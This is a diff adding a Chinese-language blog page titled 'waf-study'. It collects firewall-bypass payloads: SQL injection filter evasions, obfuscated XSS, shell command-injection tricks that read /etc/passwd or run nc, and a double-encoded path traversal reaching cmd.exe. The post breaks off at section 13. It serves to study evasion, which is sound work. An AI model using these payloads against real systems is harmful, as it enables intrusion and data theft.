@@ -1,0 +1,1899 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="QFVAlCf-2gKGgg_VeeyNJs6Z1SZ3zFiHFVraulVVNSw" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/cat.jpg?v=">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/cat.jpg?v=">
+
+
+  <link rel="mask-icon" href="/images/logo.jpg?v=" color="#222">
+
+
+  <link rel="manifest" href="/images/manifest.json">
+
+
+  <meta name="msapplication-config" content="/images/browserconfig.xml" />
+
+
+
+  <meta name="keywords" content="waf," />
+
+
+
+
+  
+
+
+  <link rel="alternate" href="/atom.xml" title="Bosch" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="0X00  Fuzz&#x2F;爆破fuzz字典 1.Seclists&#x2F;Fuzzing https:&#x2F;&#x2F;github.com&#x2F;danielmiessler&#x2F;SecLists&#x2F;tree&#x2F;master&#x2F;Fuzzing 2.Fuzz-DB&#x2F;Attack https:&#x2F;&#x2F;github.com&#x2F;fuzzdb-project&#x2F;fuzzdb&#x2F;tree&#x2F;master&#x2F;attack 3.Other Payloads 可能会被">
+<meta property="og:type" content="article">
+<meta property="og:title" content="waf-study">
+<meta property="og:url" content="https://ckcah.github.io/2020/05/03/waf-study-1/index.html">
+<meta property="og:site_name" content="Bosch">
+<meta property="og:description" content="0X00  Fuzz&#x2F;爆破fuzz字典 1.Seclists&#x2F;Fuzzing https:&#x2F;&#x2F;github.com&#x2F;danielmiessler&#x2F;SecLists&#x2F;tree&#x2F;master&#x2F;Fuzzing 2.Fuzz-DB&#x2F;Attack https:&#x2F;&#x2F;github.com&#x2F;fuzzdb-project&#x2F;fuzzdb&#x2F;tree&#x2F;master&#x2F;attack 3.Other Payloads 可能会被">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-05-02T23:02:26.000Z">
+<meta property="article:modified_time" content="2020-05-07T10:14:34.000Z">
+<meta property="article:author" content="bosch cheng">
+<meta property="article:tag" content="waf">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://ckcah.github.io/2020/05/03/waf-study-1/"/>
+
+
+
+
+
+  <title>waf-study | Bosch</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Bosch</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">cheng</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            Sitemap
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-commonweal">
+          <a href="/404/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            Commonweal 404
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://ckcah.github.io/2020/05/03/waf-study-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="bosch cheng">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/emperor.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Bosch">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">waf-study</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-05-03T07:02:26+08:00">
+                2020-05-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2020/05/03/waf-study-1/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2020/05/03/waf-study-1/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2020/05/03/waf-study-1/" class="leancloud_visitors" data-flag-title="waf-study">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Visitors&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="0X00-Fuzz-爆破"><a href="#0X00-Fuzz-爆破" class="headerlink" title="0X00  Fuzz/爆破"></a><strong>0X00  Fuzz/爆破</strong></h3><p><strong>fuzz字典</strong></p>
+<p><strong>1.Seclists/Fuzzing</strong></p>
+<p><a href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing" target="_blank" rel="noopener">https://github.com/danielmiessler/SecLists/tree/master/Fuzzing</a></p>
+<p><strong>2.Fuzz-DB/Attack</strong></p>
+<p><a href="https://github.com/fuzzdb-project/fuzzdb/tree/master/attack" target="_blank" rel="noopener">https://github.com/fuzzdb-project/fuzzdb/tree/master/attack</a></p>
+<p><strong>3.Other Payloads 可能会被ban ip，小心为妙。</strong></p>
+<p><a href="https://github.com/foospidy/payloads" target="_blank" rel="noopener">https://github.com/foospidy/payloads</a></p>
+<h3 id="0X01-正则绕过"><a href="#0X01-正则绕过" class="headerlink" title="0X01  正则绕过"></a><strong>0X01  正则绕过</strong></h3><p>多少waf 使用正则匹配。</p>
+<h4 id="黑名单检测-bypass"><a href="#黑名单检测-bypass" class="headerlink" title="黑名单检测/bypass"></a>黑名单检测/bypass</h4><p><strong>Case</strong>: SQL 注入</p>
+<h5 id="•-Step-1"><a href="#•-Step-1" class="headerlink" title="• Step 1:"></a>• Step 1:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">过滤关键词: and, or, union</span><br><span class="line">可能正则: preg_match(&#39;&#x2F;(and|or|union)&#x2F;i&#39;, $id)</span><br><span class="line">被拦截的语句: union select user, password from users</span><br><span class="line"></span><br><span class="line">bypass语句: 1 || (select user from users where user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br></pre></td></tr></table></figure>
+
+<p>• Step 2:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">过滤关键词: and, or, union, where</span><br><span class="line">被拦截的语句: 1 || (select user from users where user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class="line"></span><br><span class="line">bypass语句: 1 || (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br></pre></td></tr></table></figure>
+
+<p>• Step 3:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">过滤关键词: and, or, union, where, limit</span><br><span class="line">被拦截的语句: 1 || (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br><span class="line"></span><br><span class="line">bypass语句: 1 || (select user from users group by user_id having user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br></pre></td></tr></table></figure>
+
+<p>• Step 4:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">过滤关键词: and, or, union, where, limit, group by</span><br><span class="line">被拦截的语句: 1 || (select user from users group by user_id having user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class="line"></span><br><span class="line">bypass语句: 1 || (select substr(group_concat(user_id),1,1) user from users ) &#x3D; 1</span><br></pre></td></tr></table></figure>
+
+<p>• Step 5:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">过滤关键词: and, or, union, where, limit, group by, select</span><br><span class="line"></span><br><span class="line">被拦截的语句: 1 || (select substr(gruop_concat(user_id),1,1) user from users) &#x3D; 1</span><br><span class="line"></span><br><span class="line">bypass语句: 1 || 1 &#x3D; 1 into outfile &#39;result.txt&#39;</span><br><span class="line">bypass语句: 1 || substr(user,1,1) &#x3D; &#39;a&#39;</span><br></pre></td></tr></table></figure>
+
+<p>• Step 6:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">过滤关键词: and, or, union, where, limit, group by, select, &#39;</span><br><span class="line"></span><br><span class="line">被拦截的语句: 1 || (select substr(gruop_concat(user_id),1,1) user from users) &#x3D; 1</span><br><span class="line"></span><br><span class="line">bypass语句: 1 || user_id is not null</span><br><span class="line">bypass语句: 1 || substr(user,1,1) &#x3D; 0x61</span><br><span class="line">bypass语句: 1 || substr(user,1,1) &#x3D; unhex(61)</span><br></pre></td></tr></table></figure>
+
+<p>• Step 7:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">过滤关键词: and, or, union, where, limit, group by, select, &#39;, hex</span><br><span class="line">被拦截的语句: 1 || substr(user,1,1) &#x3D; unhex(61)</span><br><span class="line"></span><br><span class="line">bypass语句: 1 || substr(user,1,1) &#x3D; lower(conv(11,10,36))</span><br></pre></td></tr></table></figure>
+
+<p>• Step 8:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">过滤关键词: and, or, union, where, limit, group by, select, &#39;, hex, substr</span><br><span class="line">被拦截的语句: 1 || substr(user,1,1) &#x3D; lower(conv(11,10,36))</span><br><span class="line"></span><br><span class="line">bypass语句: 1 || lpad(user,7,1)</span><br></pre></td></tr></table></figure>
+
+<p>• Step 9:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">过滤关键词: and, or, union, where, limit, group by, select, &#39;, hex, substr, white space</span><br><span class="line">被拦截的语句: 1 || lpad(user,7,1)</span><br><span class="line"></span><br><span class="line">bypass语句: 1%0b||%0blpad(user,7,1)</span><br></pre></td></tr></table></figure>
+
+<h3 id="0X02-混淆-编码"><a href="#0X02-混淆-编码" class="headerlink" title="0X02    混淆/编码"></a><strong>0X02    混淆/编码</strong></h3><p><strong>1. 大小写</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">标准: &lt;script&gt;alert()&lt;&#x2F;script&gt;</span><br><span class="line">Bypassed: &lt;ScRipT&gt;alert()&lt;&#x2F;sCRipT&gt;</span><br><span class="line"></span><br><span class="line">标准: SELECT * FROM all_tables WHERE OWNER &#x3D; &#39;DATABASE_NAME&#39;</span><br><span class="line">Bypassed: sELecT * FrOm all_tables whERe OWNER &#x3D; &#39;DATABASE_NAME&#39;</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. URL 编码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">被阻断语句: &lt;svG&#x2F;x&#x3D;&quot;&gt;&quot;&#x2F;oNloaD&#x3D;confirm()&#x2F;&#x2F;</span><br><span class="line">Bypassed: %3CsvG%2Fx%3D%22%3E%22%2FoNloaD%3Dconfirm%28%29%2F%2F</span><br><span class="line"></span><br><span class="line">被阻断语句: uNIoN(sEleCT 1,2,3,4,5,6,7,8,9,10,11,12)</span><br><span class="line">Bypassed: uNIoN%28sEleCT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%29</span><br></pre></td></tr></table></figure>
+
+<p><strong>3. Unicode 编码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">标准: &lt;marquee onstart&#x3D;prompt()&gt;</span><br><span class="line">混淆: &lt;marquee onstart&#x3D;\u0070r\u06f\u006dpt()&gt;</span><br><span class="line"></span><br><span class="line">被阻断语句: &#x2F;?redir&#x3D;http:&#x2F;&#x2F;google.com</span><br><span class="line">Bypassed: &#x2F;?redir&#x3D;http:&#x2F;&#x2F;google。com (Unicode 替代)</span><br><span class="line"></span><br><span class="line">被阻断语句: &lt;marquee loop&#x3D;1 onfinish&#x3D;alert()&gt;x</span><br><span class="line">Bypassed: ＜marquee loop＝1 onfinish＝alert︵1)&gt;x (Unicode 替代)</span><br><span class="line"></span><br><span class="line">TIP: 查看这些说明 this and this reports on HackerOne. :)</span><br></pre></td></tr></table></figure>
+
+<p><strong>4. HTML 实体编码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">标准: &quot;&gt;&lt;img src&#x3D;x onerror&#x3D;confirm()&gt;</span><br><span class="line">Encoded: &quot;&gt;&lt;img src&#x3D;x onerror&#x3D;confirm&amp;lpar;&amp;rpar;&gt; (General form)</span><br><span class="line">Encoded: &amp;#34;&amp;#62;&amp;#60;img src&#x3D;x onerror&#x3D;confirm&amp;#40;&amp;#41;&amp;#62; (Numeric reference)</span><br></pre></td></tr></table></figure>
+
+<p><strong>5. 混合编码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Sometimes, WAF rules often tend to filter out a specific type of encoding.</span><br><span class="line"></span><br><span class="line">This type of filters can be bypassed by mixed encoding payloads.</span><br><span class="line"></span><br><span class="line">Tabs and newlines further add to obfuscation.</span><br></pre></td></tr></table></figure>
+
+<p><strong>混淆</strong>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;A HREF&#x3D;&quot;h</span><br><span class="line">tt p:&#x2F;&#x2F;6 6.000146.0x7.147&#x2F;&quot;&gt;XSS&lt;&#x2F;A&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>7. 双重URL编码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">这个需要服务端多次解析了url编码</span><br><span class="line"></span><br><span class="line">标准: http:&#x2F;&#x2F;victim&#x2F;cgi&#x2F;..&#x2F;..&#x2F;winnt&#x2F;system32&#x2F;cmd.exe?&#x2F;c+dir+c:\</span><br><span class="line">混淆: http:&#x2F;&#x2F;victim&#x2F;cgi&#x2F;%252E%252E%252F%252E%252E%252Fwinnt&#x2F;system32&#x2F;cmd.exe?&#x2F;c+dir+c:\</span><br><span class="line"></span><br><span class="line">标准: &lt;script&gt;alert()&lt;&#x2F;script&gt;</span><br><span class="line">混淆: %253Cscript%253Ealert()%253C%252Fscript%253E</span><br></pre></td></tr></table></figure>
+
+<p><strong>8. 通配符使用</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">用于linux命令语句注入，通过shell通配符绕过</span><br><span class="line"></span><br><span class="line">标准: &#x2F;bin&#x2F;cat &#x2F;etc&#x2F;passwd</span><br><span class="line">混淆: &#x2F;???&#x2F;??t &#x2F;???&#x2F;??ss??</span><br><span class="line">Used chars: &#x2F; ? t s</span><br><span class="line"></span><br><span class="line">标准: &#x2F;bin&#x2F;nc 127.0.0.1 1337</span><br><span class="line">混淆: &#x2F;???&#x2F;n? 2130706433 1337</span><br><span class="line">Used chars: &#x2F; ? n [0-9]</span><br></pre></td></tr></table></figure>
+
+<p><strong>9. 动态payload 生成</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">标准: &lt;script&gt;alert()&lt;&#x2F;script&gt;</span><br><span class="line">混淆: &lt;script&gt;eval(&#39;al&#39;+&#39;er&#39;+&#39;t()&#39;)&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">标准: &#x2F;bin&#x2F;cat &#x2F;etc&#x2F;passwd</span><br><span class="line">混淆: &#x2F;bi&#39;n&#39;&#39;&#39;&#x2F;c&#39;&#39;at&#39; &#x2F;e&#39;tc&#39;&#x2F;pa&#39;&#39;ss&#39;wd</span><br><span class="line"></span><br><span class="line">Bash allows path concatenation for execution.</span><br><span class="line"></span><br><span class="line">标准: &lt;iframe&#x2F;onload&#x3D;&#39;this[&quot;src&quot;]&#x3D;&quot;javascript:alert()&quot;&#39;;&gt;</span><br><span class="line">混淆: &lt;iframe&#x2F;onload&#x3D;&#39;this[&quot;src&quot;]&#x3D;&quot;jav&quot;+&quot;as&amp;Tab;cr&quot;+&quot;ipt:al&quot;+&quot;er&quot;+&quot;t()&quot;&#39;;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>9. 垃圾字符</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Normal payloads get filtered out easily.</span><br><span class="line">Adding some junk chars helps avoid detection (specific cases only).</span><br><span class="line">They often help in confusing regex based firewalls.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">标准: &lt;script&gt;alert()&lt;&#x2F;script&gt;</span><br><span class="line">混淆: &lt;script&gt;+-+-1-+-+alert(1)&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">标准: &lt;BODY onload&#x3D;alert()&gt;</span><br><span class="line">混淆: &lt;BODY onload!#$%&amp;()*~+-_.,:;?@[&#x2F;|\]^&#96;&#x3D;alert()&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>NOTE:</strong> 上述语句可能会破坏正则的匹配，达到绕过。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">标准: &lt;a href&#x3D;javascript;alert()&gt;ClickMe</span><br><span class="line">Bypassed: &lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href&#x3D;j&amp;#97v&amp;#97script&amp;#x3A;&amp;#97lert(1)&gt;ClickMe</span><br></pre></td></tr></table></figure>
+
+<p><strong>10. 插入换行符</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">部分waf可能会对换行符没有匹配</span><br><span class="line"></span><br><span class="line">标准: &lt;iframe src&#x3D;javascript:confirm(0)&quot;&gt;</span><br><span class="line">混淆: &lt;iframe src&#x3D;&quot;%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(0)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>11. 未定义变量</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash 和 perl 执行脚本中加入未定义变量，干扰正则。</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>TIP:</strong> 随便写个不存在的变量就好。<code>$aaaa,$sdayuhjbsad,$dad2ed</code>都可以。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Level 1 Obfuscation: Normal</span><br><span class="line">标准: &#x2F;bin&#x2F;cat &#x2F;etc&#x2F;passwd</span><br><span class="line">混淆: &#x2F;bin&#x2F;cat$u &#x2F;etc&#x2F;passwd$u</span><br><span class="line"></span><br><span class="line">Level 2 Obfuscation: Postion Based</span><br><span class="line">标准: &#x2F;bin&#x2F;cat &#x2F;etc&#x2F;passwd</span><br><span class="line">混淆: $u&#x2F;bin$u&#x2F;cat$u $u&#x2F;etc$u&#x2F;passwd$u</span><br><span class="line"></span><br><span class="line">Level 3 Obfuscation: Random characters</span><br><span class="line">标准: &#x2F;bin&#x2F;cat &#x2F;etc&#x2F;passwd</span><br><span class="line">混淆: $aaaaaa&#x2F;bin$bbbbbb&#x2F;cat$ccccccc $dddddd&#x2F;etc$eeeeeee&#x2F;passwd$fffffff</span><br><span class="line"></span><br><span class="line">一个精心制作的payload</span><br><span class="line"></span><br><span class="line">$sdijchkd&#x2F;???$sdjhskdjh&#x2F;??t$skdjfnskdj $sdofhsdhjs&#x2F;???$osdihdhsdj&#x2F;??ss??$skdjhsiudf</span><br></pre></td></tr></table></figure>
+
+<p><strong>12. Tab 键和换行符</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">大多数waf匹配的是空格不是Tab</span><br><span class="line"></span><br><span class="line">标准: &lt;IMG SRC&#x3D;&quot;javascript:alert();&quot;&gt;</span><br><span class="line">Bypassed: &lt;IMG SRC&#x3D;&quot; javascript:alert();&quot;&gt;</span><br><span class="line">变形: &lt;IMG SRC&#x3D;&quot; jav ascri pt:alert ();&quot;&gt;</span><br><span class="line"></span><br><span class="line">标准: http:&#x2F;&#x2F;test.com&#x2F;test?id&#x3D;1 union select 1,2,3</span><br><span class="line">标准: http:&#x2F;&#x2F;test.com&#x2F;test?id&#x3D;1%09union%23%0A%0Dselect%2D%2D%0A%0D1,2,3</span><br><span class="line"></span><br><span class="line">标准: &lt;iframe src&#x3D;javascript:alert(1)&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line">混淆:</span><br><span class="line"></span><br><span class="line">&lt;iframe    src&#x3D;j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;%28&amp;Tab;1&amp;Tab;%29&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>13. Token Breakers(翻译不了 看起来说的就是sql注入闭合)</strong></p>
